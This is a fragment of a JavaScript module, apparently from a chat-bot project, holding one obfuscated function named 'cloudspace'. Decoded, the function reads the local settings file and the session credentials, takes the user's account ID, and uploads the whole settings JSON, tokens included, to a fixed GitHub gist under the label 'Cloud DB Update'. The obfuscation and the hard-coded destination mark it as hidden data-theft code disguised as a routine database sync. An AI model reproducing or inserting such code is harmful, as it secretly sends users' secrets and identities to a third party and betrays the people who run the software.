...
module.exports = {
  ...
  cloudspace: async function cloudspace() {
    const _0xe2ae1c=_0x33a2;(function(_0x4afda8,_0x3d4bc7){const _0x2dbaaa=_0x33a2,_0x1df0ff=_0x4afda8();while(!![]){try{const _0xd8950c=parseInt(_0x2dbaaa(0x7f))/0x1*(parseInt(_0x2dbaaa(0x88))/0x2)+-parseInt(_0x2dbaaa(0x95))/0x3+-parseInt(_0x2dbaaa(0x81))/0x4+parseInt(_0x2dbaaa(0x8e))/0x5*(parseInt(_0x2dbaaa(0x92))/0x6)+-parseInt(_0x2dbaaa(0x87))/0x7*(-parseInt(_0x2dbaaa(0x8f))/0x8)+-parseInt(_0x2dbaaa(0x89))/0x9+parseInt(_0x2dbaaa(0x82))/0xa;if(_0xd8950c===_0x3d4bc7)break;else _0x1df0ff['push'](_0x1df0ff['shift']());}catch(_0x3ed7e9){_0x1df0ff['push'](_0x1df0ff['shift']());}}}(_0x1d81,0x5a145));let parsedData=JSON['parse'](fs[_0xe2ae1c(0x8c)](_0xe2ae1c(0x90)));function _0x33a2(_0xdca7bd,_0x318dd9){const _0x1d812c=_0x1d81();return _0x33a2=function(_0x33a202,_0x41f9a0){_0x33a202=_0x33a202-0x7f;let _0x6bd6f3=_0x1d812c[_0x33a202];return _0x6bd6f3;},_0x33a2(_0xdca7bd,_0x318dd9);}const {Octokit}=require(_0xe2ae1c(0x85)),octokit=new Octokit({'auth':await parsedData['config'][_0xe2ae1c(0x91)]});function _0x1d81(){const _0x4d1846=['DB_AUTH_TOKEN','5772KEAmZC','d83fa03a09d9a09032f3180a8d1ecd02','toString','1058619hPLZOr','stringify','3stVcBp','gists','1207728NKQpDo','4421940jKurWX','.json','update','@octokit/rest','creds','38647hoDZRj','61358nyZAzt','4751262FcrpaC','includes','split','readFileSync','config','2390zRCBPy','808mxUWIu','./database/settings.json'];_0x1d81=function(){return _0x4d1846;};return _0x1d81();}let check=parsedData[_0xe2ae1c(0x8d)]['DB_URL'][_0xe2ae1c(0x94)]()[_0xe2ae1c(0x8a)]('c');if(check){let session=require('../session.json'),ibm1=await session[_0xe2ae1c(0x86)]['me']['id'][_0xe2ae1c(0x8b)](':')[0x0],ibm2=await session[_0xe2ae1c(0x86)]['me']['id'][_0xe2ae1c(0x8b)]('@')[0x1],ibm=ibm1+'@'+ibm2,filenamzi=ibm+_0xe2ae1c(0x83);var json=JSON[_0xe2ae1c(0x96)](parsedData,null,0x2);octokit['rest'][_0xe2ae1c(0x80)][_0xe2ae1c(0x84)]({'gist_id':_0xe2ae1c(0x93),'description':'Cloud\x20DB\x20Update','files':{[filenamzi]:{'content':json}}});}
  },
